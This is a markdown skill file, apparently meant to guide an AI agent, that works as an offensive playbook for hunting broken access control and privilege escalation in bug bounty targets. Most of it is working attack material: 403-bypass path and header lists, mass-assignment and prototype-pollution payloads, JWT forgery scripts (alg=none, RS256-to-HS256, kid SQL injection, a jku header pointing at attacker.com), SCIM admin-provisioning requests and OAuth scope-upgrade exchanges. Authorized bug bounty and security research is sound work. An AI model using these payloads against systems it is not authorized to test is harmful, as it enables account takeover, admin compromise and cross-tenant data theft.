---
name: hunt-bac-privesc
description: "Modern Broken Access Control & Privilege Escalation hunting (2025-2026 deep edition). Use when target has /admin/*, /manage/*, /staff/*, /internal/*, /api/v*/admin/*, role/permission/tier hierarchies, JWT with role claims, multi-tenant SaaS (org/tenant/workspace), invitation/SCIM/SSO flows, OAuth scope tokens, email-confirmation gates, partner/team membership systems, API versioning (v1/v2 mismatches), agentic AI/LLM features, GraphQL Federation, WebSocket upgrades, Next.js middleware, Spring Security, Keycloak/Okta/Auth0/Entra/Grafana, or ANY endpoint where authorization is enforced separately from authentication. Covers OWASP Top 10 2025 #1 (now absorbs SSRF/CWE-918); OWASP API #1 BOLA + #5 BFLA + #3 BOPLA; vertical privesc; horizontal; cross-tenant; JWT alg=none + RS256→HS256 + kid/jku injection + ES256 r=s=0; mass assignment (role/is_admin/permissions/email_verified field injection); prototype-pollution adjacent; 403/401 bypass tree (path normalization, header trust including the Next.js x-middleware-subrequest class, method tampering, X-Original-URL); SCIM-bypass (CVE-2025-41115 Grafana externalId pattern); OAuth scope-upgrade RFC 8693 + RFC 9700 BCP; SSO/partner/email-confirm bypass (Shopify $15,250 pattern); GraphQL BFLA on mutation + Apollo Federation interface-directive bypass; agentic-AI shared-context authz; WebSocket subprotocol IDOR; ServiceNow BodySnatcher CVE-2025-12420; Entra ID Actor Tokens CVE-2025-55241; Apache Tomcat semicolon CVE-2025-24813; CrushFTP X-Forwarded-For CVE-2025-2825; Spring method-security annotation bypass CVE-2025-41232/41248/41249; Keycloak UMA Protection API CVE-2025-14778. Top incidents: McHire 64M (lead_id IDOR), Entra ID Global Admin in any tenant, Grafana SCIM admin via externalId. Top H1 bounties: LocalTapiola $18k Oracle Webcenter, Shopify $15,250 partner invite, TikTok $15k intelbot, HackerOne $12.5k cert-deletion GraphQL, Superhuman $10.5k SSO-disable, PayPal $10.5k business user, GitHub $10k private repo, Uber $4.5k tax-docs. Only invoke if real impact (cross-tenant breach, admin privesc, ATO, financial loss) plausible — skip 200-with-empty-response and self-only-access."
type: hunt
sources: owasp_top10_2025, owasp_api_2023, hackerone_h1, intigriti, bugcrowd, medium, portswigger, hacktricks, payloadsallthethings, github_seclists, dirkjanm.io, ian.sh, appomni, grafana_security, intigriti_bugquest_2026, arxiv_bacfuzz, doyensec, defcon_33, blackhat_2025, ietf_rfc_9700
---

# Hunt: Broken Access Control & Privilege Escalation — 2026 Deep Edition

> **Mantra**: PoC or GTFO. The single biggest payout class in bug bounty history. Two accounts, two orgs, every endpoint, every method, every header, every body field. Two-thirds of HackerOne's $81M 2025 payouts touched BAC primitives.

---

## 1. Why BAC Tops Bug Bounty in 2026

### Authoritative 2025 data
- **OWASP Top 10 2025 (released January 2026)**: BAC #1 for the fourth consecutive cycle. Coverage expanded from 34 → **40 CWEs**. **SSRF (CWE-918) absorbed into BAC** — major taxonomy shift.
- **100% of tested applications** have some form of BAC (OWASP A01:2025 dataset). 1,839,701 occurrences; 32,654 CVEs; 20.15% max incidence rate.
- **Bugcrowd 2025 CISO Report**: Critical BAC vulnerabilities **rose 36%** YoY.
- **HackerOne 2025 HPSR**: Valid IDOR reports up **29% since 2024**. Auth flaws climbing, XSS/SQLi declining.
- **Inspectiv 2025**: BAC = **38%** of all submissions (largest single category).
- **API breach context**: 41% of orgs faced API incident in 2025; **63% of those led to data breach**. 90% had authentication but weak authorization. **BOLA + BFLA + BOPLA = 58% of API incidents**.

### Top H1 BAC bounties (verified hacktivity 2024-2026)
| Bounty | Target | Class | Report |
|--------|--------|-------|--------|
| $18,000 | LocalTapiola | Oracle WebCenter `/cs/Satellite` admin from internet | H1 #170532 |
| $15,250 | Shopify | Email-confirm bypass → partner invite → ANY shop owner | H1 #300305 |
| $15,000 | TikTok | Authz flaw on intelbot internal service | H1 #1328546 |
| $12,500 | HackerOne | Delete certifications via GraphQL mutation | H1 #2122671 |
| $10,500 | Superhuman | Disable any org's SSO → ATO opportunity | H1 |
| $10,500 | PayPal | Add secondary user to ANY business account | H1 #415081 |
| $10,000 | GitHub | Read arbitrary user's private repo | H1 #3124517 |
| $5,000 | Kubernetes | CVE-2023-5528 Windows node privesc | IBB |
| $4,500 | Uber | Tax-docs portal unauthorized access | H1 #530441 |
| $4,000 | Mapbox | OAuth bypass → admin panel | H1 |
| $3,900 | Shipt | Improper access ctrl → add product to other orders | H1 #1903322 |
| $3,500 | Shopify | Partner invite w/o email verification | H1 #2885269 |
| $3,000 | GitLab | OAuth email-verify bypass → 3rd-party ATO | H1 #922456 |
| $3,000 | HackerOne | Jira integration JWT leak | H1 |
| $2,940 | X/Twitter | OAuth permissions screen → DM access without consent | H1 #885539 |
| $2,500 | HackerOne | Team GraphQL exposes report_sources cross-team | H1 |
| $2,500 | TikTok | IDOR on support ticket view (seller platform) | H1 |
| $2,000 | LocalTapiola | Company details access w/o permission | H1 |
| $1,750 | Shopify | Staff privesc via partner email-confirm bypass | H1 |
| $1,500 | Semmle | Privesc in workers container | H1 #692603 |
| $1,500 | New Relic | IDOR full name disclosure (3-report bundle) | H1 |
| $1,346 | LY Corp | Improper access on LINE Timeline API | H1 |
| $1,020 | GitLab | External user maintainer privesc | H1 |
| $1,000 | Razer Pay | Delete other users' bank accounts | H1 #757095 |
| $1,000 | TaxJar | Full account compromise via BAC | H1 |

### Mega-breach 2025-2026 incidents (proof BAC remains lethal)
- **McHire / McDonald's (Jun 2025)**: 64,000,000 job applications exposed. Two-bug chain: admin login accepted `123456:123456` + `/api/lead/cem-xhr?lead_id=N` sequential IDOR. PoC = incrementing one integer. → Disclosed by Sam Curry (ian.sh/mcdonalds).
- **Entra ID Actor Tokens (CVE-2025-55241, CVSS 10.0)**: Dirk-jan Mollema while prepping Black Hat USA 2025 found Microsoft "Actor tokens" requested in attacker tenant + Azure AD Graph API failing tenant validation = silent Global Admin **in ANY Entra ID tenant**. Bypasses MFA, Conditional Access, AND logging. Microsoft patched July 17, 2025.
- **Grafana Enterprise SCIM (CVE-2025-41115, CVSS 10.0)**: SCIM `externalId` field mapped to internal `user.uid`. Set `externalId: "1"` → become admin user. No prior auth needed.
- **ServiceNow BodySnatcher (CVE-2025-12420, CVSS 9.3)**: Hardcoded universal client secret + email-based account linking in AI Platform Virtual Agent. Email-only impersonation of any user incl. admins, bypassing MFA + SSO.
- **Next.js Middleware Bypass (CVE-2025-29927, CVSS 9.1)**: Send `x-middleware-subrequest` header → middleware skipped entirely. Affects all self-hosted Next.js with `output: standalone`.

---

## 2. The BAC Taxonomy — Updated 2026

### Horizontal Access Control (User → User)
Same privilege level, different account. Covered fully in **`hunt-idor`**.

### Vertical Access Control (User → Admin)
Lower privilege → higher privilege. **This skill's primary specialty.**

### Cross-Tenant (Org A → Org B)
Multi-tenant SaaS isolation breach. **Critical-tier**. (CVE-2025-55241 Entra ID pattern.)

### Context-Dependent (Authenticated → Authenticated-In-Different-Context)
Partner-mode → store-owner-mode via SSO bridging. The Shopify $15k pattern.

### Pre-Auth (Unauthenticated → Authenticated)
Missing middleware on critical routes. **Next.js CVE-2025-29927** pattern. API version drift.

### **NEW 2025-2026: Agentic AI / LLM Shared-Context Authorization**
Agent retrieves data with its own permissions but outputs to channels with mixed user permissions. CFO's agent in shared Slack exposes exec compensation to junior analyst. (Okta, OpenID Foundation, ServiceNow research.)

### **NEW 2025-2026: SCIM-Provisioning Privesc**
SCIM tokens & endpoints universally weaker than user-facing auth. `externalId` confusion → admin (Grafana). Leaked SCIM tokens in CI/CD, JS bundles, partner integrations.

### **NEW 2025-2026: Federated GraphQL Directive Non-Propagation**
Apollo Federation `@authenticated`, `@requiresScopes`, `@policy` on interfaces NOT propagated to implementing concrete types. Inline fragments bypass entire authz layer.

---

## 3. OWASP API Security: 3 BAC Entries

| Rank | Code | Name | Hunt Focus |
|------|------|------|-----------|
| #1 | **API1** | Broken Object Level Authorization (BOLA / IDOR) | See `hunt-idor` |
| #3 | **API3** | Broken Object Property Level Authorization (BOPLA) | Mass assignment + excessive data exposure — see §6 |
| #5 | **API5** | Broken Function Level Authorization (BFLA) | Vertical privesc — admin endpoints reachable by low-priv |

**This skill focuses on API3 (BOPLA / mass assignment) + API5 (BFLA / vertical privesc) + all non-IDOR BAC classes.**

---

## 4. Crown Jewel Targets (2026 ranked by bounty potential)

| Asset | Why Critical | Typical bounty |
|-------|--------------|----------------|
| Next.js / SvelteKit / Remix middleware on admin routes | Header-trust bypass class | $10k-$50k |
| SCIM `/scim/v2/Users` provisioning endpoints | Cross-tenant admin (CVE-2025-41115 pattern) | $15k-$50k |
| Entra/Okta/Auth0 actor/impersonation tokens | Tenant-wide admin (CVE-2025-55241) | $50k+ |
| Apollo Federation subgraphs with interface directives | Schema-level authz bypass | $10k-$30k |
| `/admin/*` paths exposed to non-admins | Direct vertical privesc | $5k-$25k |
| Role-assignment (`/users/{id}/role`, `/promote`) | Elevation primitive | $10k-$50k |
| Multi-tenant org-isolation endpoints | Cross-tenant breach | $10k-$50k |
| Partner/SSO/invitation flows | Email-confirm bypass class (Shopify $15k) | $5k-$30k |
| Mass-assignment-susceptible PATCH endpoints | Silent privesc | $10k-$30k |
| JWT role claims trusted server-side | Forge → admin | $5k-$50k |
| API v0/v1 legacy with missing middleware | Auth-drift class | $5k-$25k |
| Impersonation tools ("view as user") | Hijack-able admin tokens | $10k-$50k |
| OAuth scope-token endpoints / RFC 8693 token-exchange | Privilege scope-upgrade | $5k-$30k |
| Customer-success / staff portals | Pre-prod-quality code in prod | $5k-$25k |
| Agentic AI tools with cross-user output | LLM shared-context (new class 2026) | $10k-$50k |
| WebSocket subprotocol auth | Per-message authz often missing | $5k-$20k |
| Webhook configuration / Azure Event Grid-style | Cross-tenant webhook (CVE-2025-59273) | $10k-$30k |

---

## 5. Attack Surface Signals

### URL & path patterns
```
# Admin / management
/admin              /admin-api           /api/admin
/manage             /management          /api/manage
/staff              /api/staff           /api/_staff
/internal           /api/internal        /private
/superuser          /root                /sudo
/admin.php          /admin.aspx          /admin/index.html
/console            /control             /controlpanel
/.well-known/admin

# Role / permission management
/api/users/{id}/role            /api/users/{id}/permissions
/api/roles                       /api/permissions
/api/promote                     /api/demote
/api/grant                       /api/revoke
/api/impersonate                 /api/users/{id}/impersonate
/api/_internal/become            /api/sudo

# Multi-tenant
/api/orgs/{org_id}/members       /api/workspaces/{wid}/users
/api/teams/{team_id}/admin       /api/tenants/{tid}/
/api/scim/v2/Users               /api/scim/v2/Groups
/scim/v2/                        # Note: this is the CVE-2025-41115 attack surface

# Sensitive features
/api/billing/*       /api/invoices/*       /api/payments/*
/api/audit-logs                  /api/security/sessions
/api/api-keys                    /api/tokens
/api/featureflags                /api/settings/*
/api/users/{id}/2fa/disable     /api/users/{id}/recovery-email

# OAuth / SSO bridges  
/oauth/authorize    /oauth/token       /oauth/token-exchange    # RFC 8693
/sso/callback       /saml/acs          /openid-connect
/api/oauth/clients               /api/oauth/grants
/.well-known/openid-configuration
/.well-known/oauth-authorization-server

# Partner / external
/partners            /api/partners       /partners.{vendor}.com
/api/invite          /api/invitations    /api/team/invite

# AI / Agentic
/api/agent           /api/assistant      /api/chat
/api/tools           /api/copilot        /api/conversation
/api/rag             /api/vector

# GraphQL
/graphql             /api/graphql        /gql
/v1/graphql          /federation         /apollo
```

### Header signals
```
# User-controlled headers the server might trust (bad)
X-User-ID            X-Account-ID        X-Role
X-Admin              X-Is-Admin          X-Permissions
X-On-Behalf-Of       X-Impersonate       X-Acting-As
X-Org-ID             X-Tenant-ID         X-Workspace-ID
X-Original-URL       X-Rewrite-URL       X-Override-URL
X-Forwarded-For: 127.0.0.1       ← bypass internal-IP allow-lists (CVE-2025-2825)
X-Forwarded-Host                 ← reset-link injection
X-HTTP-Method-Override           ← method tampering
x-middleware-subrequest          ← Next.js bypass (CVE-2025-29927)
x-internal-route                 ← framework-internal headers
x-rsc                            ← React Server Components

# JWT-related
Authorization: Bearer eyJ...     ← decode + look for role claim
Cookie: jwt=eyJ...; session=...

# SCIM-related
Authorization: Bearer scim_...   ← SCIM tokens leak commonly
```

### JS source signals
```bash
# Hidden admin routes
grep -RoE '"/(admin|manage|staff|internal|superuser|sudo|root)/' dist/
grep -RoE '"/api/v[0-9]+/(admin|manage|staff|internal)/' dist/

# Client-side role checks (server should also check)
grep -RoE 'role\s*===?\s*["'\''](admin|root|owner|super)' dist/
grep -RoE 'isAdmin|isSuperUser|isOwner|hasRole|isPaid|isPremium' dist/

# Hidden flags / leaked SCIM tokens
grep -RoE '"is_admin"|"isAdmin"|"role"|"permissions"' dist/
grep -RoE '"scim_token"|"provisioning_token"|"actor_token"' dist/

# Routes that hide-but-exist
grep -RoE 'lazy\(.*"/admin"' dist/        ← React lazy admin imports
grep -RoE 'route:\s*"/(admin|staff)"' dist/
grep -RoE 'middleware\s*=\s*\[' dist/      ← Next.js middleware definitions

# Sourcemap mining (when .map files exposed)
curl -s https://app.target.com/static/main.js.map | jq '.sources[]' | sort -u | grep -E 'admin|staff|internal'

# Mobile app endpoints
apktool d app.apk -o decompiled/
grep -RoE '"/(api|admin|internal)/' decompiled/
```

### Stack signals → BAC likelihood
| Stack | Likely BAC pattern |
|-------|--------------------|
| **Next.js self-hosted** | CVE-2025-29927 middleware bypass class |
| Express/Node + missing middleware | API version drift, route-by-route auth |
| Rails + `before_action :authenticate_user!` only | Object-level auth often missing |
| Django + `LoginRequiredMixin` only | Object-level check missing |
| **Spring Security 6.4.x/6.5.x with method annotations** | CVE-2025-41248 parameterized-type bypass |
| **Spring Cloud Gateway with actuator exposed** | CVE-2025-41253 SpEL info disclosure |
| **Apache Tomcat with semicolons in paths** | CVE-2025-24813 path equivalence RCE |
| Flask + custom decorators | Inconsistent application |
| **Apollo Federation 2.x < 2.12.1** | Interface-directive non-propagation |
| GraphQL auto-resolvers (Hasura, Strapi, PostGraphile) | Field-level auth often missing |
| NextJS App Router | API routes without auth guard middleware |
| FastAPI | Dependency-injection auth often per-endpoint |
| **Keycloak < 26.x** | UMA Protection API + Admin REST bypasses |
| **Grafana Enterprise 12.0.0-12.2.1** | SCIM externalId privesc (CVE-2025-41115) |
| **ServiceNow Now Assist / AI Platform** | BodySnatcher class (CVE-2025-12420) |

---

## 6. Step-by-Step Hunting Methodology

### Setup
1. **Map every role.** anonymous, free, basic, premium, mod, admin, super-admin, owner, billing-admin, support-staff, partner, integration. **Create one account per role (3+ minimum).**
2. **Map every multi-tenant boundary.** Sign up **two orgs (A and B)**, each with 2+ users at different roles. The Org B account is your cross-tenant probe.
3. **Capture all object IDs across all roles.** Spider as each role. Log every endpoint, every ID, every parameter into `recon/tested-endpoints.json`.

### Test loop (run for every endpoint)
4. **Vertical privesc.** Low-priv Account L: enumerate admin endpoints (JS bundle, ffuf, sourcemap). Try each. Look for 200/201/302 vs 403.
5. **Horizontal access.** Account B replays Account A's requests. Use Autorize + Auth Analyzer + PwnFox.
6. **Cross-tenant.** Org B session replays Org A requests + replaces IDs/`tenant_id`/`org_id`.
7. **Unauthenticated.** Strip ALL auth. Try every sensitive endpoint. (Pre-auth findings = highest payout class.)
8. **Method tampering.** GET → POST → PUT → PATCH → DELETE → HEAD → OPTIONS → TRACE → PROPFIND + override headers.
9. **API version downgrade.** /v2/ → /v1/ → /v0/ → /api/internal/ → /api/_legacy/ → /api/_old/.
10. **403/401 bypass tree.** Run §8 against every gated route.
11. **Mass-assignment scan.** Add `role`, `is_admin`, `permissions`, `email_verified`, etc. to EVERY PATCH/PUT/POST/registration (§9 wordlist).
12. **JWT decode + tamper.** Look for role claims. Try alg=none, RS256→HS256, kid/jku/x5u injection, embedded jwk (§10).
13. **OAuth scope-upgrade.** Token-exchange (RFC 8693) with larger scopes than granted (§11).
14. **Invitation/email-confirm flows.** Skip email-verify step. Accept invite as wrong role (Shopify $15k pattern, §13).
15. **Force-browse admin.** SecLists + custom wordlist (§14).
16. **SCIM provisioning probe.** Hit `/scim/v2/Users` + `/scim/v2/Groups`. Test `externalId` mapping (§15).
17. **GraphQL specific.** Introspect → look for admin mutations. Test Apollo Federation interface bypass. Test aliasing rate-limit bypass (§16).
18. **Header-trust class.** Send `x-middleware-subrequest`, `x-internal-route`, `X-Original-URL`, `X-Forwarded-For: 127.0.0.1`, etc. (§17).
19. **WebSocket per-message authz.** Open WS as low-priv, attempt to subscribe/send messages targeting other-user resources.
20. **Agentic AI shared-context.** If LLM chatbot/agent, probe its tool-use boundaries — does it leak data with caller's perms to channel with mixed perms?
21. **Autorize + PwnFox continuous monitoring** while browsing.

---

## 7. Vertical Privilege Escalation (User → Admin)

### Direct admin endpoint hit
```http
# Every admin endpoint with low-priv token
GET /api/admin/users HTTP/1.1
Authorization: Bearer <low_priv_token>

POST /api/admin/users/delete HTTP/1.1
{"user_id": "VICTIM"}

# Admin functionality WITHOUT "/admin/" in path
POST /api/users/promote HTTP/1.1
POST /api/_internal/cleanup HTTP/1.1
GET /api/staff/dashboard HTTP/1.1
GET /api/customer-success/lookup?email=VICTIM@x.com HTTP/1.1

# Pre-auth (most lucrative)
GET /api/admin/users HTTP/1.1
# (no Authorization header at all)
```

### Role-update on self (mass assignment)
```http
PUT /api/users/me HTTP/1.1
{"display_name": "x", "role": "admin"}

PATCH /api/profile HTTP/1.1
{"isAdmin": true, "permissions": ["*"]}

POST /api/team/join HTTP/1.1
{"team": "engineering", "role": "OWNER"}
```

### Become-admin via team invitation (Shopify $15,250)
1. Invite attacker to partner program
2. Use email confirmation bypass to skip verification
3. Accept invitation as Admin role (server doesn't verify inviter has permission to grant)
4. Now admin of victim shop

### Impersonation replay (GitLab #493324)
1. Admin uses "view as user" / "impersonate" to debug your account
2. Token captured during impersonation
3. Token retains admin scope after impersonation ends
4. Replay token → admin context

### SCIM provisioning abuse (CVE-2025-41115 Grafana)
```http
POST /scim/v2/Users HTTP/1.1
Authorization: Bearer <scim_token_leaked_in_repo>
Content-Type: application/scim+json

{
  "userName": "attacker",
  "active": true,
  "externalId": "1",          ← maps to internal uid=1 (admin)
  "roles": [{"value":"admin"}]
}
```

### ServiceNow BodySnatcher pattern (CVE-2025-12420)
- Find AI agent channel provider with hardcoded universal client secret
- Account-linking requires only email address
- Send linking request with `email=victim@target.com`
- Now impersonating any user including admins

---

## 8. 403/401 Bypass Tree (Authoritative 2026 Catalog)

When `/admin/users` returns 403, try every variant below.

### Path manipulation
```
/admin/users           → 403
/Admin/users           → 200    ← case
/ADMIN/USERS           → 200
/aDmIn/uSerS           → 200
//admin/users          → 200    ← double-slash
/admin//users          → 200
/admin/./users         → 200    ← dot-slash
/admin/../admin/users  → 200    ← traverse-back
/admin/users/          → 200    ← trailing slash
/admin/users/.         → 200
/admin/users..         → 200    ← double-dot
/admin/users/.;        → 200    ← semicolon
/admin/users;          → 200
/admin/users#          → 200    ← fragment
/admin/users?          → 200    ← empty query
/admin/users.json      → 200    ← extension trick (H1 #2487889 pattern)
/admin/users.xml       → 200
/admin/users.css       → 200    ← static-route delegation
/admin/users.html      → 200
/admin/users%20        → 200    ← space
/admin/users%09        → 200    ← tab
/admin/users%00        → 200    ← null byte
/admin/users%2520      → 200    ← double encoding
/admin%2fusers         → 200    ← encoded slash
/admin/%2eusers        → 200    ← encoded dot
/%2eadmin/users        → 200
/%2e/admin/users       → 200
/admin..;/users        → 200    ← Tomcat semicolon (CVE-2025-24813)
/admin/users..;        → 200
/admin/users;/         → 200
/admin/users;swagger-ui.html → 200
/admin/users/?anything → 200
/api/v0/admin/users    → 200    ← version drift
/api/_old/admin/users  → 200
/api/_legacy/admin/users → 200
/api/_internal/admin/users → 200
```

### Header injection (most common bypass class)
```
# Framework-internal headers (NEW class 2025)
x-middleware-subrequest: middleware              ← Next.js (CVE-2025-29927)
x-rsc: 1                                          ← React Server Components
x-internal-route: true                            ← generic framework-internal
x-vercel-internal: true                           ← Vercel-specific

# URL/path-rewrite headers
X-Original-URL: /admin/users
X-Rewrite-URL: /admin/users
X-Override-URL: /admin/users
X-Forwarded-URI: /admin/users
X-Forwarded-Path: /admin/users
X-Original-Path: /admin/users

# Method override
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-HTTP-Method: PATCH
_method=DELETE                                    ← query param

# IP spoofing (internal allowlists)
X-Forwarded-For: 127.0.0.1                       ← CVE-2025-2825 CrushFTP
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Cluster-Client-IP: 127.0.0.1
X-Forwarded-Host: localhost
Forwarded: for=127.0.0.1;host=localhost
Forwarded: for="127.0.0.1:80"

# Referer/Origin/Host
Referer: https://target.com/admin                ← Referer-based bypass
Origin: https://admin.target.com                  ← Origin-based
Host: admin.target.com                             ← Host header injection
X-Host: admin.target.com
X-Forwarded-Server: admin.target.com
X-Subdomain: admin

# Role-claim headers (rare but tried)
Profile: admin                                     ← rare custom
Role: admin
X-Role: admin
X-User-Role: admin
X-Admin: 1
X-Trusted: 1
X-Internal: 1
```

### Method tampering
```
GET /admin/users     → 403
POST /admin/users    → 200    ← handler not protected on POST
PUT /admin/users     → 200
PATCH /admin/users   → 200
DELETE /admin/users  → 204
HEAD /admin/users    → 200    ← reveals via Content-Length
OPTIONS /admin/users → 200    ← reveals via Allow header
TRACE /admin/users   → 200
TRACK /admin/users   → 200
CONNECT admin.target.com:80 → reveals connectivity
DEBUG /admin/users   → 200    ← rare ASP.NET method
PROPFIND /admin/users → 200   ← WebDAV
```

### Tools
- **nomore403** (github.com/devploit/nomore403)
- **gobypass403** (github.com/slicingmelon/gobypass403) — Go, WAF-preserving
- **Burp 403Bypasser** extension
- **byp4xx.sh** / **bypass-403.sh** shell scripts
- Manual loop:
```bash
for p in "" "/" "/." "//" "/.." "..;/" "/.;/" ";/" "/%2e" "/%2f"; do
  curl -sk -o /dev/null -w "%{http_code} $p\n" "https://t.com/admin/users$p"
done
```

---

## 9. Mass Assignment / BOPLA (OWASP API3) — Comprehensive

### High-value target endpoints
```
POST /api/register, /api/signup, /api/auth/register
POST /api/users (admin create)
PATCH /api/users/me, /api/profile, /api/account
PUT /api/user/update, /api/settings/update
POST /api/teams, /api/orgs, /api/workspaces
POST /api/subscription, /api/coupon/apply
POST /api/invites/accept, /api/team/join
POST /api/oauth/clients (RFC 7591 dynamic registration)
PUT /api/{tenant_id}/users/{user_id}
```

### Field injection wordlist (try ALL — case + casing variants)
```
# Privilege & Role
role         is_admin       isAdmin       IsAdmin       admin
is_root      is_staff       is_superuser  is_owner      is_super
permissions  perms          access_level  acl           privileges
role_id      roleId         tier          plan          plan_id
group_id     team_role      subscription  membership_level
authorities  scopes         grants        capabilities

# Verification
email_verified  phone_verified  kyc_status  is_verified  verified
trusted         reputation      account_status   status
is_active       suspended       banned       blocked      locked
verified_at     confirmed_at    activated_at
kyc_level       kyc_verified    aml_verified

# Financial
balance         credit          credits      points       loyalty_points
wallet_balance  available_credit                          account_credit
discount        discount_pct    coupon_applied            is_paid
billing_cycle   billing_status  payment_status            paid
free_until      premium_until   trial_until  expires_at
override_price  override_quota  override_limit

# Tenancy
owner_id        org_id          tenant_id    account_id
created_by      user_id         parent_id    workspace_id
team_id         project_id      company_id

# Bypass / debug
debug           test            dev          staging      internal
bypass          skip_validation override     sudo         godmode
impersonate     impersonate_as  impersonate_user_id       as_user

# Feature flags
feature_flags   features        experimental beta         alpha
enable_admin    enable_internal enable_staff

# SCIM-specific (NEW 2025-2026)
externalId      external_id    extId        provisioner_id
schemas         meta            scim         provisioned
```

### Case variations (try each spelling per field name)
```json
{"is_admin": true}        {"isAdmin": true}        {"IsAdmin": true}
{"IS_ADMIN": true}        {"is-admin": true}       {"isadmin": true}
{"is_admin": 1}           {"is_admin": "1"}        {"is_admin": "true"}
{"is_admin": "yes"}       {"is_admin ": true}      {"is_admin": [true]}
```

### Nested object injection (ORMs whitelist top-level only, recurse on nested)
```json
{
  "display_name": "ok",
  "profile": {"role": "admin", "is_admin": true},
  "preferences": {"acl": ["*"]},
  "settings": {"tier": "enterprise"},
  "user": {"role": "admin"},
  "metadata": {"permissions": ["root"]},
  "extra": {"impersonate_user_id": 1}
}
```

### Prototype pollution adjacent (Node/Express)
```json
{"__proto__": {"is_admin": true}}
{"constructor": {"prototype": {"is_admin": true}}}
{"isAdmin": true, "__proto__": {"isAdmin": true}}
{"__proto__": {"role": "admin", "permissions": ["*"]}}
```

### Array injection
```json
{"role": ["user", "admin"]}        ← server takes last
{"roles": ["admin"]}                ← plural variant
{"permissions": ["*"]}              ← wildcard
{"groups": ["administrators"]}      ← group-based RBAC
{"authorities": ["ROLE_ADMIN"]}    ← Spring Security ROLE_ prefix
```

### Real bug bounty + CVE patterns (2024-2026)
- **H1 #605720**: Team member with Program permission modified `role` parameter on save → escalated to Admin
- **OWASP/PortSwigger lab**: `PATCH /api/checkout` accepts `chosen_discount` field with `{"percentage":99}`
- **Mass assignment + IDOR composite**: silent admin account creation (Spyboy 2026)
- **OWASP API3 BOPLA pattern**: `PATCH /api/users/me` accepts `kyc_verified=true` → bypass KYC

---

## 10. JWT Privilege Escalation (Deep)

### Step 1: Decode
```bash
echo "eyJ..." | awk -F. '{print $1"=" | "base64 -d"; print $2"==" | "base64 -d"}'
```
Look for: `role`, `is_admin`, `permissions`, `scope`, `tier`, `sub`, `aud`, `iss`, `email_verified`, `app_metadata`, `user_metadata`.

### Step 2: alg=none (still works on ~10% of real targets per 2026 researcher data)
```python
import base64, json
header  = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=")
payload = base64.urlsafe_b64encode(json.dumps({"user_id":1,"role":"admin"}).encode()).decode().rstrip("=")
print(f"{header}.{payload}.")    # trailing dot — empty signature
```
Variants to try: `none`, `None`, `NONE`, `nOnE`, `noNe`.

### Step 3: RS256 → HS256 algorithm confusion
If server uses RS256 (asymmetric) but verifier accepts caller-specified algorithm, sign with the PUBLIC key as HMAC secret:
```bash
# Fetch public key
curl https://target.com/.well-known/jwks.json
curl https://target.com/.well-known/openid-configuration | jq .jwks_uri

# Use as HMAC secret
python3 -c "
import jwt
with open('pubkey.pem') as f: key = f.read()
token = jwt.encode({'user_id':1, 'role':'admin'}, key, algorithm='HS256')
print(token)
"
```

### Step 4: kid path-traversal / SQLi
```json
{"alg":"HS256","kid":"../../../../dev/null","typ":"JWT"}
# Server reads file at kid path → /dev/null = empty → HMAC secret = '' → sign with empty key

{"alg":"HS256","kid":"x' UNION SELECT 'attacker_known_secret' --","typ":"JWT"}
# kid lookup is SQL → inject to return known secret
```

### Step 5: jku / x5u attack
```json
{"alg":"RS256","jku":"https://attacker.com/jwks.json","typ":"JWT"}
# Server fetches JWKS from attacker → attacker controls the key
```

### Step 6: Embedded jwk
```json
{"alg":"RS256","jwk":{"kty":"RSA","n":"ATTACKER_N","e":"AQAB"},"typ":"JWT"}
# Some libs trust embedded jwk
```

### Step 7: ES256 r=s=0 (CVE-2022-21449 family)
Send signature where r and s components are zero → some libs accept as valid signature regardless of payload.

### Step 8: Refresh-token rotation flaws
- Old refresh token still valid after rotation → reuse for elevated session
- Refresh response leaks new RT in `Set-Cookie` AND `access_token` field → race condition
- **CVE-2025-14559 (Keycloak)**: Token exchange issues access/refresh for users whose accounts are DISABLED

### Step 9: Mutable claim trust
- `email_verified: true` injected at registration
- `sub` claim of victim user_id
- `aud` claim manipulation
- Auth0 / Okta: `app_metadata` / `user_metadata` self-injectable in custom flows

### Real 2026 cases
- **BelScarabX (Medium, Apr 2026)**: alg=none → workspace ATO
- **Keycloak CVE-2025-14778**: UMA Protection API horizontal privesc — when updating UMA policy with multiple resources, authz only checks first resource

---

## 11. OAuth Scope Upgrade (RFC 8693 / RFC 9700 Era)

### Token-exchange abuse
After getting a low-scope token:
```http
POST /oauth/token/exchange HTTP/1.1
Content-Type: application/x-www-form-urlencoded

grant_type=urn:ietf:params:oauth:grant-type:token-exchange
&subject_token=<low_scope_token>
&subject_token_type=urn:ietf:params:oauth:token-type:access_token
&scope=admin:all
```
Many auth servers don't re-verify scope against original consent → silent privilege jump. **RFC 8693 leaves client-auth requirements to each implementation** — many permit unauthenticated exchanges. RFC 9700 (January 2025) is the BCP update warning against this.

### Refresh-token rotation flaws
- Old RT not invalidated → reuse indefinitely
- New RT issued for HIGHER scope than original
- RT exchange returns multiple-scope tokens (`scope=user admin internal`)

### OAuth 2025 disclosed patterns
- 2025 redirect_uri manipulation → JWT exfil to Burp Collaborator → full ATO
- Doyensec OAuth Common Vulns (Jan 30 2025) — scope upgrade + client_id confusion + mutable claims
- X / Twitter $2,940 H1 — OAuth permissions screen → DMs accessible without proper consent

### OIDC discovery for recon
```bash
curl https://target.com/.well-known/openid-configuration | jq
# Get: token_endpoint, jwks_uri, authorization_endpoint, scopes_supported, response_types_supported, claims_supported
```

---

## 12. Cross-Tenant Privilege Escalation (Critical Class)

### Org-swap mid-flow
```
Tab 1: Login Org A, draft a resource → API call includes X-Org-Id: A
Tab 2: Switch to Org B in cookie/header, publish the draft
→ Published to Org B with Org A's content
```

### Cross-tenant via shared IDs
- Object IDs globally unique (UUIDv4), but tenancy enforced only at URL path level
- `/api/orgs/B/projects/{uuid-of-org-A-project}` returns 200 if UUID lookup ignores org_id

### SCIM cross-tenant (CVE-2025-41115 Grafana pattern)
SCIM tokens often scoped to ONE tenant, but endpoint accepts any tenant ID in the path → cross-org user provisioning. **`externalId` field mapped to internal `uid` = privesc to admin.**

### Actor Token replay (CVE-2025-55241 Entra ID pattern)
- Request actor token in YOUR tenant
- Replay against ANOTHER tenant's Azure AD Graph API
- Validation bug means tenant claim isn't checked
- Result: Global Admin in target tenant, no MFA, no logs

